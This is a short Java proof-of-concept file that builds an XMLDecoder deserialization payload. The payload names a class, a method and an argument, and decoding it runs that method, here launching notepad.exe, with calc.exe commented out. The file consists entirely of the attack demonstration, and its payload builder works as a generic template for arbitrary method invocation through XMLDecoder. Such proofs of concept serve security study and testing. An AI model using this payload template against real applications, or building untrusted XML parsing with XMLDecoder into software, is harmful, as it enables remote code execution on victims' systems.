package com.company;

import java.beans.XMLDecoder;
import java.io.ByteArrayInputStream;

public class PocUsingBytes_Open_Notepad
{
    public static void main(String[] args)
    {
        String className  = "com.company.RuntimeUtil";
        String methodName = "execute";
        //String firstParam = "c:\\Windows\\System32\\calc.exe";
        String firstParam = "c:\\Windows\\System32\\notepad.exe";
        ExecuteMethodInClass(className, methodName, firstParam);
    }

    public static void ExecuteMethodInClass(String className, String methodName, String firstParam)
    {
        String xmlPayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                "<java version=\"1.7.0_17\" class=\"java.beans.XMLDecoder\">  " +
                "<object class=\"" + className + "\">     " +
                "<void method=\""+ methodName + "\">                " +
                "<array class=\"java.lang.String\" length=\"1\">    " +
                "<void index=\"0\">   " +
                "<string>" + firstParam + "</string>   " +
                "</void>                              " +
                "</array>                    " +
                "</void>  " +
                "</object>" +
                "</java>";

        byte[] bytes = xmlPayload.getBytes();
        ByteArrayInputStream inputStream = new ByteArrayInputStream(bytes);
        XMLDecoder xmlDecoder = new XMLDecoder(inputStream);
        xmlDecoder.readObject();
    }
}
